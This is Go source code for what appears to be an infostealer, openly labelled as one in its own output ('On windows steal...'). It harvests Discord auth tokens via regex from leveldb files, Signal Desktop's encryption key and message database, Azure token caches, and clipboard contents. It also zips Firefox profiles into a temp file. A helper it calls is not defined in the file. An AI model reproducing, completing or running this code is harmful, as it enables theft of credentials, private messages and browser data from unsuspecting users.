package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"regexp"
	"runtime"

	"github.com/f1bonacc1/glippy"
)

func CheckError(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

func readFile(filename string) ([]byte, error) {
	file, err := os.Open(filename)

	if err != nil {
		return nil, err
	}
	defer file.Close()

	stats, statsErr := file.Stat()
	if statsErr != nil {
		return nil, statsErr
	}

	var size int64 = stats.Size()
	bytes := make([]byte, size)

	bufr := bufio.NewReader(file)
	_, err = bufr.Read(bytes)

	return bytes, err
}

func GetDiscordTokensWorker(pattern string) ([]string, error) {
	res := make([]string, 10)
	r, _ := regexp.Compile("[A-Za-z0-9_-]{24}\\.[A-Za-z0-9_-]{6}\\.[A-Za-z0-9_-]{27}|mfa\\.[a-zA-Z0-9_\\-]{84}")
	files, err := filepath.Glob(os.Getenv("HOME") + "/Library/Application Support/Discord/Local Storage/leveldb/" + pattern)
	if err != nil {
		return nil, err
	} else {
		for _, filename := range files {
			b, err := os.ReadFile(filename)
			if err != nil {
				return nil, err
			}
			str := string(b)
			matches := r.FindAllString(str, -1)
			if len(matches) > 0 {
				res = append(res, matches...)
			}
		}
	}
	return res, nil
}

func GetDiscordTokens() ([]string, error) {
	tokens := make([]string, 10)
	part1, err := GetDiscordTokensWorker("*.log")
	if err != nil {
		return nil, err
	}
	tokens = append(tokens, part1...)
	part2, err := GetDiscordTokensWorker("*.ldb")
	if err != nil {
		return nil, err
	}
	tokens = append(tokens, part2...)
	return tokens, nil
}

// How to decode:
// https://danielbeadle.net/post/2020-05-19-signal-desktop-database/
func GetSignalData() ([]byte, []byte, error) {
	keyFile := ""
	database := ""
	var keyFileData []byte
	var databaseData []byte
	var err error
	if runtime.GOOS == "darwin" {
		keyFile = os.Getenv("HOME") + "/Library/Application Support/Signal/config.json"
		database = os.Getenv("HOME") + "/Library/Application Support/Signal/sql/db.sqlite"
	}
	if _, err := os.Stat(keyFile); err == nil {
		fmt.Println("[+] Signal found... getting the data")
		keyFileData, err = readFile(keyFile)
		databaseData, err = readFile(database)
	}
	return keyFileData, databaseData, err
}

func GetAzureToken() ([]byte, error) {
	tokenPath := ""
	var tokenData []byte
	var err error
	switch runtime.GOOS {
	case "windows":
		tokenPath = os.Getenv("HOMEPATH") + "\\.azure\\accessTokens.json"
	default:
		tokenPath = os.Getenv("HOME") + "/.azure/msal_token_cache.json"
	}
	if _, err := os.Stat(tokenPath); err == nil {
		tokenData, err = readFile(tokenPath)
	}
	return tokenData, err
}

// Return the full path to zip file with the profile data
func GetFirefoxProfileData() string {
	var profilePath string
	var target_path string
	switch runtime.GOOS {
	case "windows":
		profilePath = os.Getenv("APPDATA") + "\\Mozilla\\Firefox\\Profiles"
		target_path = "c:\\temp\\firefox_profiles.zip"
	case "darwin":
		profilePath = os.Getenv("HOME") + "/Library/Application Support/Firefox/Profiles"
		target_path = "/tmp/firefox_profiles.zip"
	default:
		profilePath = os.Getenv("HOME") + "/Library/Application Support/Firefox/Profiles"
		target_path = "/tmp/firefox_profiles.zip"
	}
	CreateZipFile(profilePath, target_path)
	return target_path
}

func main() {
	fmt.Println("On windows steal: browser code, look for azure and aws tokens in $HOME, Discord, Signal!")
	fmt.Println("")
	keyData, data, err := GetSignalData()
	CheckError(err)
	fmt.Println(len(keyData), len(data))
	tokens, err := GetDiscordTokens()
	CheckError(err)
	fmt.Println(tokens)
	text, err := glippy.Get()
	CheckError(err)
	fmt.Println("Clipboard :" + text)
	azureToken, err := GetAzureToken()
	CheckError(err)
	fmt.Println(len(azureToken))
	fmt.Println("[+] Getting firefox profiles as a zip file")
	firefox_path := GetFirefoxProfileData()
	fmt.Println("[+] GOT FIREFOX DATA " + firefox_path)
}
